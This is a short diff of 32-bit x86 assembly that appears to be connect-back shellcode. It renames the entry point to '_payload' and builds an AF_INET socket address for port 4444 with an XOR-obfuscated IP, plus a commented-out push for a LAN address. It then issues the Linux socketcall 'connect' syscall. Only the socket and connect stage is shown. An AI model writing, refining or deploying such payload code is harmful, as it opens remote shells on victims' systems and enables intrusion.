@@ -1,6 +1,6 @@
 BITS 32
-global _start
-_start:
+global _payload
+_payload:
 
 xor eax,eax
 xor ebx,ebx
@@ -20,14 +20,17 @@ mov ecx, 0x0111117f
 xor ecx, 0x10111101
 inc ecx
 push cx
+;push long 0xfe01a8c0
 push word 0x5c11
-push byte 0x02
-mov ecx,esp
+push word 0x02
+mov eax,esp
+push edx
 push byte 0x10
-push ecx
+push eax
 push esi
 mov ecx,esp
 mov bl,0x3
+xor eax,eax
 mov al,102
 xor edx,edx
 int 0x80
